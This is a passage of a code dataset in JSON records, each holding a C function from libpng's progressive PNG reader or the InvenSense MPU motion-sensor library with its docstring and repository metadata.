0);\n   }\n#endif /* PNG_READ_INTERLACING_SUPPORTED */\n}", "path": "build\\iphonesdk-utils-2.0\\pngcrush\\libpng\\pngpread.c", "repo_name": "waneck/linux-ios-toolchain", "stars": 163, "license": "None", "language": "c", "size": 13500}
{"docstring": "/* PRIVATE */\n", "func_signal": "png_push_crc_skip(png_structp png_ptr, png_uint_32 skip)", "code": "{\n   png_ptr->process_mode = PNG_SKIP_MODE;\n   png_ptr->skip_length = skip;\n}", "path": "build\\iphonesdk-utils-2.0\\pngcrush\\libpng\\pngpread.c", "repo_name": "waneck/linux-ios-toolchain", "stars": 163, "license": "None", "language": "c", "size": 13500}
{"docstring": "/* PRIVATE */\n", "func_signal": "png_process_IDAT_data(png_structp png_ptr, png_bytep buffer,\n   png_size_t buffer_length)", "code": "{\n   int ret;\n\n   if ((png_ptr->flags & PNG_FLAG_ZLIB_FINISHED) && buffer_length)\n      png_benign_error(png_ptr, \"Extra compression data\");\n\n   png_ptr->zstream.next_in = buffer;\n   png_ptr->zstream.avail_in = (uInt)buffer_length;\n   for (;;)\n   {\n      ret = inflate(&png_ptr->zstream, Z_PARTIAL_FLUSH);\n      if (ret != Z_OK)\n      {\n         if (ret == Z_STREAM_END)\n         {\n            if (png_ptr->zstream.avail_in)\n               png_benign_error(png_ptr, \"Extra compressed data\");\n\n            if (!(png_ptr->zstream.avail_out))\n            {\n               png_push_process_row(png_ptr);\n            }\n\n            png_ptr->mode |= PNG_AFTER_IDAT;\n            png_ptr->flags |= PNG_FLAG_ZLIB_FINISHED;\n            break;\n         }\n         else if (ret == Z_BUF_ERROR)\n            break;\n\n         else\n            png_error(png_ptr, \"Decompression Error\");\n      }\n      if (!(png_ptr->zstream.avail_out))\n      {\n         if ((\n#ifdef PNG_READ_INTERLACING_SUPPORTED\n             png_ptr->interlaced && png_ptr->pass > 6) ||\n             (!png_ptr->interlaced &&\n#endif\n             png_ptr->row_number == png_ptr->num_rows))\n         {\n           if (png_ptr->zstream.avail_in)\n             png_warning(png_ptr, \"Too much data in IDAT chunks\");\n           png_ptr->flags |= PNG_FLAG_ZLIB_FINISHED;\n           break;\n         }\n         png_push_process_row(png_ptr);\n         png_ptr->zstream.avail_out =\n             (uInt) PNG_ROWBYTES(png_ptr->pixel_depth,\n             png_ptr->iwidth) + 1;\n         png_ptr->zstream.next_out = png_ptr->row_buf;\n      }\n\n      else\n         break;\n   }\n}", "path": "build\\iphonesdk-utils-2.0\\pngcrush\\libpng\\pngpread.c", "repo_name": "waneck/linux-ios-toolchain", "stars": 163, "license": "None", "language": "c", "size": 13500}
{"docstring": "/* PRIVATE */\n", "func_signal": "png_push_crc_finish(png_structp png_ptr)", "code": "{\n   if (png_ptr->skip_length && png_ptr->save_buffer_size)\n   {\n      png_size_t save_size;\n\n      if (png_ptr->skip_length < (png_uint_32)png_ptr->save_buffer_size)\n         save_size = (png_size_t)png_ptr->skip_length;\n      else\n         save_size = png_ptr->save_buffer_size;\n\n      png_calculate_crc(png_ptr, png_ptr->save_buffer_ptr, save_size);\n\n      png_ptr->skip_length -= save_size;\n      png_ptr->buffer_size -= save_size;\n      png_ptr->save_buffer_size -= save_size;\n      png_ptr->save_buffer_ptr += save_size;\n   }\n   if (png_ptr->skip_length && png_ptr->current_buffer_size)\n   {\n      png_size_t save_size;\n\n      if (png_ptr->skip_length < (png_uint_32)png_ptr->current_buffer_size)\n         save_size = (png_size_t)png_ptr->skip_length;\n      else\n         save_size = png_ptr->current_buffer_size;\n\n      png_calculate_crc(png_ptr, png_ptr->current_buffer_ptr, save_size);\n\n      png_ptr->skip_length -= save_size;\n      png_ptr->buffer_size -= save_size;\n      png_ptr->current_buffer_size -= save_size;\n      png_ptr->current_buffer_ptr += save_size;\n   }\n   if (!png_ptr->skip_length)\n   {\n      if (png_ptr->buffer_size < 4)\n      {\n         png_push_save_buffer(png_ptr);\n         return;\n      }\n\n      png_crc_finish(png_ptr, 0);\n      png_ptr->process_mode = PNG_READ_CHUNK_MODE;\n   }\n}", "path": "build\\iphonesdk-utils-2.0\\pngcrush\\libpng\\pngpread.c", "repo_name": "waneck/linux-ios-toolchain", "stars": 163, "license": "None", "language": "c", "size": 13500}
{"docstring": "/* PRIVATE */\n", "func_signal": "png_push_have_end(png_structp png_ptr, png_infop info_ptr)", "code": "{\n   if (png_ptr->end_fn != NULL)\n      (*(png_ptr->end_fn))(png_ptr, info_ptr);\n}", "path": "build\\iphonesdk-utils-2.0\\pngcrush\\libpng\\pngpread.c", "repo_name": "waneck/linux-ios-toolchain", "stars": 163, "license": "None", "language": "c", "size": 13500}
{"docstring": "/* PRIVATE */\n", "func_signal": "png_push_read_zTXt(png_structp png_ptr, png_infop info_ptr)", "code": "{\n   if (png_ptr->buffer_size && png_ptr->current_text_left)\n   {\n      png_size_t text_size;\n\n      if (png_ptr->buffer_size < (png_uint_32)png_ptr->current_text_left)\n         text_size = png_ptr->buffer_size;\n\n      else\n         text_size = png_ptr->current_text_left;\n\n      png_crc_read(png_ptr, (png_bytep)png_ptr->current_text_ptr, text_size);\n      png_ptr->current_text_left -= text_size;\n      png_ptr->current_text_ptr += text_size;\n   }\n   if (!(png_ptr->current_text_left))\n   {\n      png_textp text_ptr;\n      png_charp text;\n      png_charp key;\n      int ret;\n      png_size_t text_size, key_size;\n\n      if (png_ptr->buffer_size < 4)\n      {\n         png_push_save_buffer(png_ptr);\n         return;\n      }\n\n      png_push_crc_finish(png_ptr);\n\n      key = png_ptr->current_text;\n\n      for (text = key; *text; text++)\n         /* Empty loop */ ;\n\n      /* zTXt can't have zero text */\n      if (text >= key + png_ptr->current_text_size)\n      {\n         png_ptr->current_text = NULL;\n         png_free(png_ptr, key);\n         return;\n      }\n\n      text++;\n\n      if (*text != PNG_TEXT_COMPRESSION_zTXt) /* Check compression byte */\n      {\n         png_ptr->current_text = NULL;\n         png_free(png_ptr, key);\n         return;\n      }\n\n      text++;\n\n      png_ptr->zstream.next_in = (png_bytep )text;\n      png_ptr->zstream.avail_in = (uInt)(png_ptr->current_text_size -\n         (text - key));\n      png_ptr->zstream.next_out = png_ptr->zbuf;\n      png_ptr->zstream.avail_out = (uInt)png_ptr->zbuf_size;\n\n      key_size = text - key;\n      text_size = 0;\n      text = NULL;\n      ret = Z_STREAM_END;\n\n      while (png_ptr->zstream.avail_in)\n      {\n         ret = inflate(&png_ptr->zstream, Z_PARTIAL_FLUSH);\n         if (ret != Z_OK && ret != Z_STREAM_END)\n         {\n            inflateReset(&png_ptr->zstream);\n            png_ptr->zstream.avail_in = 0;\n            png_ptr->current_text = NULL;\n            png_free(png_ptr, key);\n            png_free(png_ptr, text);\n            return;\n         }\n         if (!(png_ptr->zstream.avail_out) || ret == Z_STREAM_END)\n         {\n            if (text == NULL)\n            {\n               text = (png_charp)png_malloc(png_ptr,\n                     (png_ptr->zbuf_size\n                     - png_ptr->zstream.avail_out + key_size + 1));\n\n               png_memcpy(text + key_size, png_ptr->zbuf,\n                  png_ptr->zbuf_size - png_ptr->zstream.avail_out);\n\n               png_memcpy(text, key, key_size);\n\n               text_size = key_size + png_ptr->zbuf_size -\n                  png_ptr->zstream.avail_out;\n\n               *(text + text_size) = '\\0';\n            }\n            else\n            {\n               png_charp tmp;\n\n               tmp = text;\n               text = (png_charp)png_malloc(png_ptr, text_size +\n                  (png_ptr->zbuf_size \n                  - png_ptr->zstream.avail_out + 1));\n\n               png_memcpy(text, tmp, text_size);\n               png_free(png_ptr, tmp);\n\n               png_memcpy(text + text_size, png_ptr->zbuf,\n                  png_ptr->zbuf_size - png_ptr->zstream.avail_out);\n\n               text_size += png_ptr->zbuf_size - png_ptr->zstream.avail_out;\n               *(text + text_size) = '\\0';\n            }\n            if (ret != Z_STREAM_END)\n            {\n               png_ptr->zstream.next_out = png_ptr->zbuf;\n               png_ptr->zstream.avail_out = (uInt)png_ptr->zbuf_size;\n            }\n         }\n         else\n         {\n            break;\n         }\n\n         if (ret == Z_STREAM_END)\n            break;\n      }\n\n      inflateReset(&png_ptr->zstream);\n      png_ptr->zstream.avail_in = 0;\n\n      if (ret != Z_STREAM_END)\n      {\n         png_ptr->current_text = NULL;\n         png_free(png_ptr, key);\n         png_free(png_ptr, text);\n         return;\n      }\n\n      png_ptr->current_text = NULL;\n      png_free(png_ptr, key);\n      key = text;\n      text += key_size;\n\n      text_ptr = (png_textp)png_malloc(png_ptr,\n          png_sizeof(png_text));\n      text_ptr->compression = PNG_TEXT_COMPRESSION_zTXt;\n      text_ptr->key = key;\n#ifdef PNG_iTXt_SUPPORTED\n      text_ptr->lang = NULL;\n      text_ptr->lang_key = NULL;\n#endif\n      text_ptr->text = text;\n\n      ret = png_set_text_2(png_ptr, info_ptr, text_ptr, 1);\n\n      png_free(png_ptr, key);\n      png_free(png_ptr, text_ptr);\n\n      if (ret)\n        png_warning(png_ptr, \"Insufficient memory to store text chunk\");\n   }\n}", "path": "build\\iphonesdk-utils-2.0\\pngcrush\\libpng\\pngpread.c", "repo_name": "waneck/linux-ios-toolchain", "stars": 163, "license": "None", "language": "c", "size": 13500}
{"docstring": "/* PRIVATE */\n", "func_signal": "png_push_read_IDAT(png_structp png_ptr)", "code": "{\n   PNG_IDAT;\n   if (!(png_ptr->mode & PNG_HAVE_CHUNK_HEADER))\n   {\n      png_byte chunk_length[4];\n\n      if (png_ptr->buffer_size < 8)\n      {\n         png_push_save_buffer(png_ptr);\n         return;\n      }\n\n      png_push_fill_buffer(png_ptr, chunk_length, 4);\n      png_ptr->push_length = png_get_uint_31(png_ptr, chunk_length);\n      png_reset_crc(png_ptr);\n      png_crc_read(png_ptr, png_ptr->chunk_name, 4);\n      png_ptr->mode |= PNG_HAVE_CHUNK_HEADER;\n\n      if (png_memcmp(png_ptr->chunk_name, png_IDAT, 4))\n      {\n         png_ptr->process_mode = PNG_READ_CHUNK_MODE;\n         if (!(png_ptr->flags & PNG_FLAG_ZLIB_FINISHED))\n            png_error(png_ptr, \"Not enough compressed data\");\n         return;\n      }\n\n      png_ptr->idat_size = png_ptr->push_length;\n   }\n   if (png_ptr->idat_size && png_ptr->save_buffer_size)\n   {\n      png_size_t save_size;\n\n      if (png_ptr->idat_size < (png_uint_32)png_ptr->save_buffer_size)\n      {\n         save_size = (png_size_t)png_ptr->idat_size;\n\n         /* Check for overflow */\n         if ((png_uint_32)save_size != png_ptr->idat_size)\n            png_error(png_ptr, \"save_size overflowed in pngpread\");\n      }\n      else\n         save_size = png_ptr->save_buffer_size;\n\n      png_calculate_crc(png_ptr, png_ptr->save_buffer_ptr, save_size);\n\n      if (!(png_ptr->flags & PNG_FLAG_ZLIB_FINISHED))\n         png_process_IDAT_data(png_ptr, png_ptr->save_buffer_ptr, save_size);\n\n      png_ptr->idat_size -= save_size;\n      png_ptr->buffer_size -= save_size;\n      png_ptr->save_buffer_size -= save_size;\n      png_ptr->save_buffer_ptr += save_size;\n   }\n   if (png_ptr->idat_size && png_ptr->current_buffer_size)\n   {\n      png_size_t save_size;\n\n      if (png_ptr->idat_size < (png_uint_32)png_ptr->current_buffer_size)\n      {\n         save_size = (png_size_t)png_ptr->idat_size;\n\n         /* Check for overflow */\n         if ((png_uint_32)save_size != png_ptr->idat_size)\n            png_error(png_ptr, \"save_size overflowed in pngpread\");\n      }\n      else\n         save_size = png_ptr->current_buffer_size;\n\n      png_calculate_crc(png_ptr, png_ptr->current_buffer_ptr, save_size);\n      if (!(png_ptr->flags & PNG_FLAG_ZLIB_FINISHED))\n         png_process_IDAT_data(png_ptr, png_ptr->current_buffer_ptr, save_size);\n\n      png_ptr->idat_size -= save_size;\n      png_ptr->buffer_size -= save_size;\n      png_ptr->current_buffer_size -= save_size;\n      png_ptr->current_buffer_ptr += save_size;\n   }\n   if (!png_ptr->idat_size)\n   {\n      if (png_ptr->buffer_size < 4)\n      {\n         png_push_save_buffer(png_ptr);\n         return;\n      }\n\n      png_crc_finish(png_ptr, 0);\n      png_ptr->mode &= ~PNG_HAVE_CHUNK_HEADER;\n      png_ptr->mode |= PNG_AFTER_IDAT;\n   }\n}", "path": "build\\iphonesdk-utils-2.0\\pngcrush\\libpng\\pngpread.c", "repo_name": "waneck/linux-ios-toolchain", "stars": 163, "license": "None", "language": "c", "size": 13500}
{"docstring": "/* PRIVATE */\n", "func_signal": "png_push_have_info(png_structp png_ptr, png_infop info_ptr)", "code": "{\n   if (png_ptr->info_fn != NULL)\n      (*(png_ptr->info_fn))(png_ptr, info_ptr);\n}", "path": "build\\iphonesdk-utils-2.0\\pngcrush\\libpng\\pngpread.c", "repo_name": "waneck/linux-ios-toolchain", "stars": 163, "license": "None", "language": "c", "size": 13500}
{"docstring": "/* PRIVATE */\n", "func_signal": "png_push_read_sig(png_structp png_ptr, png_infop info_ptr)", "code": "{\n   png_size_t num_checked = png_ptr->sig_bytes,\n             num_to_check = 8 - num_checked;\n\n   if (png_ptr->buffer_size < num_to_check)\n   {\n      num_to_check = png_ptr->buffer_size;\n   }\n\n   png_push_fill_buffer(png_ptr, &(info_ptr->signature[num_checked]),\n      num_to_check);\n   png_ptr->sig_bytes = (png_byte)(png_ptr->sig_bytes + num_to_check);\n\n   if (png_sig_cmp(info_ptr->signature, num_checked, num_to_check))\n   {\n      if (num_checked < 4 &&\n          png_sig_cmp(info_ptr->signature, num_checked, num_to_check - 4))\n         png_error(png_ptr, \"Not a PNG file\");\n      else\n         png_error(png_ptr, \"PNG file corrupted by ASCII conversion\");\n   }\n   else\n   {\n      if (png_ptr->sig_bytes >= 8)\n      {\n         png_ptr->process_mode = PNG_READ_CHUNK_MODE;\n      }\n   }\n}", "path": "build\\iphonesdk-utils-2.0\\pngcrush\\libpng\\pngpread.c", "repo_name": "waneck/linux-ios-toolchain", "stars": 163, "license": "None", "language": "c", "size": 13500}
{"docstring": "/* PRIVATE */\n", "func_signal": "png_push_have_row(png_structp png_ptr, png_bytep row)", "code": "{\n   if (png_ptr->row_fn != NULL)\n      (*(png_ptr->row_fn))(png_ptr, row, png_ptr->row_number,\n         (int)png_ptr->pass);\n}", "path": "build\\iphonesdk-utils-2.0\\pngcrush\\libpng\\pngpread.c", "repo_name": "waneck/linux-ios-toolchain", "stars": 163, "license": "None", "language": "c", "size": 13500}
{"docstring": "/* PRIVATE */\n", "func_signal": "png_push_handle_unknown(png_structp png_ptr, png_infop info_ptr, png_uint_32\n   length)", "code": "{\n   png_uint_32 skip = 0;\n\n   if (!(png_ptr->chunk_name[0] & 0x20))\n   {\n#ifdef PNG_READ_UNKNOWN_CHUNKS_SUPPORTED\n      if (png_handle_as_unknown(png_ptr, png_ptr->chunk_name) !=\n         PNG_HANDLE_CHUNK_ALWAYS\n#ifdef PNG_READ_USER_CHUNKS_SUPPORTED\n         && png_ptr->read_user_chunk_fn == NULL\n#endif\n         )\n#endif\n         png_chunk_error(png_ptr, \"unknown critical chunk\");\n\n      info_ptr = info_ptr; /* To quiet some compiler warnings */\n   }\n\n#ifdef PNG_READ_UNKNOWN_CHUNKS_SUPPORTED\n   if (png_ptr->flags & PNG_FLAG_KEEP_UNKNOWN_CHUNKS)\n   {\n#ifdef PNG_MAX_MALLOC_64K\n      if (length > (png_uint_32)65535L)\n      {\n          png_warning(png_ptr, \"unknown chunk too large to fit in memory\");\n          skip = length - (png_uint_32)65535L;\n          length = (png_uint_32)65535L;\n      }\n#endif\n      png_memcpy((png_charp)png_ptr->unknown_chunk.name,\n                 (png_charp)png_ptr->chunk_name, \n                 png_sizeof(png_ptr->unknown_chunk.name));\n      png_ptr->unknown_chunk.name[png_sizeof(png_ptr->unknown_chunk.name) - 1]\n        = '\\0';\n\n      png_ptr->unknown_chunk.size = (png_size_t)length;\n\n      if (length == 0)\n         png_ptr->unknown_chunk.data = NULL;\n\n      else\n      {\n         png_ptr->unknown_chunk.data = (png_bytep)png_malloc(png_ptr,\n            (png_size_t)length);\n         png_crc_read(png_ptr, (png_bytep)png_ptr->unknown_chunk.data, length);\n      }\n\n#ifdef PNG_READ_USER_CHUNKS_SUPPORTED\n      if (png_ptr->read_user_chunk_fn != NULL)\n      {\n         /* Callback to user unknown chunk handler */\n         int ret;\n         ret = (*(png_ptr->read_user_chunk_fn))\n           (png_ptr, &png_ptr->unknown_chunk);\n\n         if (ret < 0)\n            png_chunk_error(png_ptr, \"error in user chunk\");\n\n         if (ret == 0)\n         {\n            if (!(png_ptr->chunk_name[0] & 0x20))\n               if (png_handle_as_unknown(png_ptr, png_ptr->chunk_name) !=\n                    PNG_HANDLE_CHUNK_ALWAYS)\n                  png_chunk_error(png_ptr, \"unknown critical chunk\");\n            png_set_unknown_chunks(png_ptr, info_ptr,\n               &png_ptr->unknown_chunk, 1);\n         }\n      }\n\n      else\n#endif\n        png_set_unknown_chunks(png_ptr, info_ptr, &png_ptr->unknown_chunk, 1);\n      png_free(png_ptr, png_ptr->unknown_chunk.data);\n      png_ptr->unknown_chunk.data = NULL;\n   }\n\n   else\n#endif\n      skip=length;\n   png_push_crc_skip(png_ptr, skip);\n}", "path": "build\\iphonesdk-utils-2.0\\pngcrush\\libpng\\pngpread.c", "repo_name": "waneck/linux-ios-toolchain", "stars": 163, "license": "None", "language": "c", "size": 13500}
{"docstring": "/* PRIVATE */\n", "func_signal": "png_push_handle_tEXt(png_structp png_ptr, png_infop info_ptr, png_uint_32\n   length)", "code": "{\n   if (!(png_ptr->mode & PNG_HAVE_IHDR) || (png_ptr->mode & PNG_HAVE_IEND))\n      {\n         png_error(png_ptr, \"Out of place tEXt\");\n         info_ptr = info_ptr; /* To quiet some compiler warnings */\n      }\n\n#ifdef PNG_MAX_MALLOC_64K\n   png_ptr->skip_length = 0;  /* This may not be necessary */\n\n   if (length > (png_uint_32)65535L) /* Can't hold entire string in memory */\n   {\n      png_warning(png_ptr, \"tEXt chunk too large to fit in memory\");\n      png_ptr->skip_length = length - (png_uint_32)65535L;\n      length = (png_uint_32)65535L;\n   }\n#endif\n\n   png_ptr->current_text = (png_charp)png_malloc(png_ptr,\n      (png_size_t)(length + 1));\n   png_ptr->current_text[length] = '\\0';\n   png_ptr->current_text_ptr = png_ptr->current_text;\n   png_ptr->current_text_size = (png_size_t)length;\n   png_ptr->current_text_left = (png_size_t)length;\n   png_ptr->process_mode = PNG_READ_tEXt_MODE;\n}", "path": "build\\iphonesdk-utils-2.0\\pngcrush\\libpng\\pngpread.c", "repo_name": "waneck/linux-ios-toolchain", "stars": 163, "license": "None", "language": "c", "size": 13500}
{"docstring": "/**\n *  @brief      Read raw gyro data directly from the registers.\n *  @param[out] data        Raw data in hardware units.\n *  @return     0 if successful.\n */\n", "func_signal": "uint8_t mpu_get_gyro_reg(int16_t *data)", "code": "{\n\tuint8_t tmp[6];\n\n\tif (!(st.chip_cfg.sensors & INV_XYZ_GYRO))\n\t\treturn 1;\n\n\tif (i2c_read(st.hw->addr, st.reg->raw_gyro, 6, tmp))\n\t\treturn 1;\n\tdata[0] = (tmp[0] << 8) | tmp[1];\n\tdata[1] = (tmp[2] << 8) | tmp[3];\n\tdata[2] = (tmp[4] << 8) | tmp[5];\n\treturn 0;\n}", "path": "MotionSensor\\inv_mpu_lib\\inv_mpu.c", "repo_name": "rpicopter/MotionSensorExample", "stars": 133, "license": "None", "language": "c", "size": 196}
{"docstring": "/**\n *  @brief      Get one packet from the FIFO.\n *  If @e sensors does not contain a particular sensor, disregard the data\n *  returned to that pointer.\n *  \\n @e sensors can contain a combination of the following flags:\n *  \\n INV_X_GYRO, INV_Y_GYRO, INV_Z_GYRO\n *  \\n INV_XYZ_GYRO\n *  \\n INV_XYZ_ACCEL\n *  \\n If the FIFO has no new data, @e sensors will be zero.\n *  \\n If the FIFO is disabled, @e sensors will be zero and this function will\n *  return a non-zero error code.\n *  @param[out] gyro        Gyro data in hardware units.\n *  @param[out] accel       Accel data in hardware units.\n *  @param[out] sensors     Mask of sensors read from FIFO.\n *  @param[out] more        Number of remaining packets.\n *  @return     0 if successful.\n */\n", "func_signal": "uint8_t mpu_read_fifo(int16_t *gyro, int16_t *accel,\n\t\t\t\t\t\t\t\t\t\t\tuint8_t *sensors, uint8_t *more)", "code": "{\n\t/* Assumes maximum packet size is gyro (6) + accel (6). */\n\tuint8_t data[MAX_PACKET_LENGTH];\n\tuint8_t packet_size = 0;\n\tuint16_t fifo_count, index = 0;\n\n\tif (st.chip_cfg.dmp_on)\n\t\treturn 1;\n\n\tsensors[0] = 0;\n\tif (!st.chip_cfg.sensors)\n\t\treturn 1;\n\tif (!st.chip_cfg.fifo_enable)\n\t\treturn 1;\n\n\tif (st.chip_cfg.fifo_enable & INV_X_GYRO)\n\t\tpacket_size += 2;\n\tif (st.chip_cfg.fifo_enable & INV_Y_GYRO)\n\t\tpacket_size += 2;\n\tif (st.chip_cfg.fifo_enable & INV_Z_GYRO)\n\t\tpacket_size += 2;\n\tif (st.chip_cfg.fifo_enable & INV_XYZ_ACCEL)\n\t\tpacket_size += 6;\n\n\tif (i2c_read(st.hw->addr, st.reg->fifo_count_h, 2, data))\n\t\treturn 1;\n\tfifo_count = (data[0] << 8) | data[1];\n\tif (fifo_count < packet_size)\n\t\treturn 0;\n#if defined MPU_DEBUG\n    printf_P(\"FIFO count: %hd\\r\\n\", fifo_count);\n#endif\n\tif (fifo_count > (st.hw->max_fifo >> 1))\n\t{\n\t\t/* FIFO is 50% full, better check overflow bit. */\n\t\tif (i2c_read(st.hw->addr, st.reg->int_status, 1, data))\n\t\t\treturn 1;\n\t\tif (data[0] & BIT_FIFO_OVERFLOW)\n\t\t{\n\t\t\tmpu_reset_fifo();\n\t\t\treturn 2;\n\t\t}\n\t}\n\n\tif (i2c_read(st.hw->addr, st.reg->fifo_r_w, packet_size, data))\n\t\treturn 1;\n\tmore[0] = fifo_count / packet_size - 1;\n\tsensors[0] = 0;\n\n\tif ((index != packet_size) && st.chip_cfg.fifo_enable & INV_XYZ_ACCEL)\n\t{\n\t\taccel[0] = (data[index+0] << 8) | data[index+1];\n\t\taccel[1] = (data[index+2] << 8) | data[index+3];\n\t\taccel[2] = (data[index+4] << 8) | data[index+5];\n\t\tsensors[0] |= INV_XYZ_ACCEL;\n\t\tindex += 6;\n\t}\n\tif ((index != packet_size) && st.chip_cfg.fifo_enable & INV_X_GYRO)\n\t{\n\t\tgyro[0] = (data[index+0] << 8) | data[index+1];\n\t\tsensors[0] |= INV_X_GYRO;\n\t\tindex += 2;\n\t}\n\tif ((index != packet_size) && st.chip_cfg.fifo_enable & INV_Y_GYRO)\n\t{\n\t\tgyro[1] = (data[index+0] << 8) | data[index+1];\n\t\tsensors[0] |= INV_Y_GYRO;\n\t\tindex += 2;\n\t}\n\tif ((index != packet_size) && st.chip_cfg.fifo_enable & INV_Z_GYRO)\n\t{\n\t\tgyro[2] = (data[index+0] << 8) | data[index+1];\n\t\tsensors[0] |= INV_Z_GYRO;\n\t\tindex += 2;\n\t}\n\n\treturn 0;\n}", "path": "MotionSensor\\inv_mpu_lib\\inv_mpu.c", "repo_name": "rpicopter/MotionSensorExample", "stars": 133, "license": "None", "language": "c", "size": 196}
{"docstring": "/**\n *  @brief      Read from a single register.\n *  NOTE: The memory and FIFO read/write registers cannot be accessed.\n *  @param[in]  reg     Register address.\n *  @param[out] data    Register data.\n *  @return     0 if successful.\n */\n", "func_signal": "uint8_t mpu_read_reg(uint8_t reg, uint8_t *data)", "code": "{\n\tif (reg == st.reg->fifo_r_w || reg == st.reg->mem_r_w)\n\t\treturn 1;\n\tif (reg >= st.hw->num_reg)\n\t\treturn 1;\n\treturn i2c_read(st.hw->addr, reg, 1, data);\n}", "path": "MotionSensor\\inv_mpu_lib\\inv_mpu.c", "repo_name": "rpicopter/MotionSensorExample", "stars": 133, "license": "None", "language": "c", "size": 196}
{"docstring": "/**\n *  @brief      Set the accel full-scale range.\n *  @param[in]  fsr Desired full-scale range.\n *  @return     0 if successful.\n */\n", "func_signal": "uint8_t mpu_set_accel_fsr(uint8_t fsr)", "code": "{\n\tuint8_t data;\n\n\tif (!(st.chip_cfg.sensors))\n\t\treturn 1;\n\n\tswitch (fsr)\n\t{\n\tcase 2:\n\t\tdata = INV_FSR_2G << 3;\n\t\tbreak;\n\tcase 4:\n\t\tdata = INV_FSR_4G << 3;\n\t\tbreak;\n\tcase 8:\n\t\tdata = INV_FSR_8G << 3;\n\t\tbreak;\n\tcase 16:\n\t\tdata = INV_FSR_16G << 3;\n\t\tbreak;\n\tdefault:\n\t\treturn 1;\n\t}\n\n\tif (st.chip_cfg.accel_fsr == (data >> 3))\n\t\treturn 0;\n\tif (i2c_write(st.hw->addr, st.reg->accel_cfg, 1, &data))\n\t\treturn 1;\n\tst.chip_cfg.accel_fsr = data >> 3;\n\treturn 0;\n}", "path": "MotionSensor\\inv_mpu_lib\\inv_mpu.c", "repo_name": "rpicopter/MotionSensorExample", "stars": 133, "license": "None", "language": "c", "size": 196}
{"docstring": "/**\n *  @brief      Set interrupt level.\n *  @param[in]  active_low  1 for active low, 0 for active high.\n *  @return     0 if successful.\n */\n", "func_signal": "uint8_t mpu_set_int_level(uint8_t active_low)", "code": "{\n\tst.chip_cfg.active_low_int = active_low;\n\treturn 0;\n}", "path": "MotionSensor\\inv_mpu_lib\\inv_mpu.c", "repo_name": "rpicopter/MotionSensorExample", "stars": 133, "license": "None", "language": "c", "size": 196}
{"docstring": "/**\n *  @brief      Set compass sampling rate.\n *  The compass on the auxiliary I2C bus is read by the MPU hardware at a\n *  maximum of 100Hz. The actual rate can be set to a fraction of the gyro\n *  sampling rate.\n *\n *  \\n WARNING: The new rate may be different than what was requested. Call\n *  mpu_get_compass_sample_rate to check the actual setting.\n *  @param[in]  rate    Desired compass sampling rate (Hz).\n *  @return     0 if successful.\n */\n", "func_signal": "uint8_t mpu_set_compass_sample_rate(uint16_t rate)", "code": "{\n#ifdef AK89xx_SECONDARY\n\tuint8_t div;\n\tif (!rate || rate > st.chip_cfg.sample_rate || rate > MAX_COMPASS_SAMPLE_RATE)\n\t\treturn 1;\n\n\tdiv = st.chip_cfg.sample_rate / rate - 1;\n\tif (i2c_write(st.hw->addr, st.reg->s4_ctrl, 1, &div))\n\t\treturn 1;\n\tst.chip_cfg.compass_sample_rate = st.chip_cfg.sample_rate / (div + 1);\n\treturn 0;\n#else\n\treturn 1;\n#endif\n}", "path": "MotionSensor\\inv_mpu_lib\\inv_mpu.c", "repo_name": "rpicopter/MotionSensorExample", "stars": 133, "license": "None", "language": "c", "size": 196}
{"docstring": "/**\n *  @brief      Trigger gyro/accel/compass self-test.\n *  On success/error, the self-test returns a mask representing the sensor(s)\n *  that failed. For each bit, a one (1) represents a \"pass\" case; conversely,\n *  a zero (0) indicates a failure.\n *\n *  \\n The mask is defined as follows:\n *  \\n Bit 0:   Gyro.\n *  \\n Bit 1:   Accel.\n *  \\n Bit 2:   Compass.\n *\n *  \\n Currently, the hardware self-test is unsupported for MPU6500. However,\n *  this function can still be used to obtain the accel and gyro biases.\n *\n *  \\n This function must be called with the device either face-up or face-down\n *  (z-axis is parallel to gravity).\n *  @param[out] gyro        Gyro biases in q16 format.\n *  @param[out] accel       Accel biases (if applicable) in q16 format.\n *  @return     Result mask (see above).\n */\n", "func_signal": "uint8_t mpu_run_self_test(int32_t *gyro, int32_t *accel)", "code": "{\n#ifdef MPU6050\n\tconst uint8_t tries = 2;\n\tint32_t gyro_st[3], accel_st[3];\n\tuint8_t accel_result, gyro_result;\n#ifdef AK89xx_SECONDARY\n\tuint8_t compass_result;\n#endif\n\tint ii;\n#endif\n\tint result;\n\tuint8_t accel_fsr, fifo_sensors, sensors_on;\n\tuint16_t gyro_fsr, sample_rate, lpf;\n\tuint8_t dmp_was_on;\n\n\tif (st.chip_cfg.dmp_on)\n\t{\n\t\tmpu_set_dmp_state(0);\n\t\tdmp_was_on = 1;\n\t}\n\telse\n\t\tdmp_was_on = 0;\n\n\t/* Get initial settings. */\n\tmpu_get_gyro_fsr(&gyro_fsr);\n\tmpu_get_accel_fsr(&accel_fsr);\n\tmpu_get_lpf(&lpf);\n\tmpu_get_sample_rate(&sample_rate);\n\tsensors_on = st.chip_cfg.sensors;\n\tmpu_get_fifo_config(&fifo_sensors);\n\n\t/* For older chips, the self-test will be different. */\n#if defined MPU6050\n\tfor (ii = 0; ii < tries; ii++)\n\t\tif (!get_st_biases(gyro, accel, 0))\n\t\t\tbreak;\n\tif (ii == tries)\n\t{\n\t\t/* If we reach this point, we most likely encountered an I2C error.\n\t\t * We'll just report an error for all three sensors.\n\t\t */\n\t\tresult = 0;\n\t\tgoto restore;\n\t}\n\tfor (ii = 0; ii < tries; ii++)\n\t\tif (!get_st_biases(gyro_st, accel_st, 1))\n\t\t\tbreak;\n\tif (ii == tries)\n\t{\n\t\t/* Again, probably an I2C error. */\n\t\tresult = 0;\n\t\tgoto restore;\n\t}\n\taccel_result = accel_self_test(accel, accel_st);\n\tgyro_result = gyro_self_test(gyro, gyro_st);\n\n\tresult = 0;\n\tif (!gyro_result)\n\t\tresult |= 0x01;\n\tif (!accel_result)\n\t\tresult |= 0x02;\n\n#ifdef AK89xx_SECONDARY\n\tcompass_result = compass_self_test();\n\tif (!compass_result)\n\t\tresult |= 0x04;\n#endif\nrestore:\n#elif defined MPU6500\n\t/* For now, this function will return a \"pass\" result for all three sensors\n\t * for compatibility with current test applications.\n\t */\n\tget_st_biases(gyro, accel, 0);\n\tresult = 0x7;\n#endif\n\t/* Set to invalid values to ensure no I2C writes are skipped. */\n\tst.chip_cfg.gyro_fsr = 0xFF;\n\tst.chip_cfg.accel_fsr = 0xFF;\n\tst.chip_cfg.lpf = 0xFF;\n\tst.chip_cfg.sample_rate = 0xFFFF;\n\tst.chip_cfg.sensors = 0xFF;\n\tst.chip_cfg.fifo_enable = 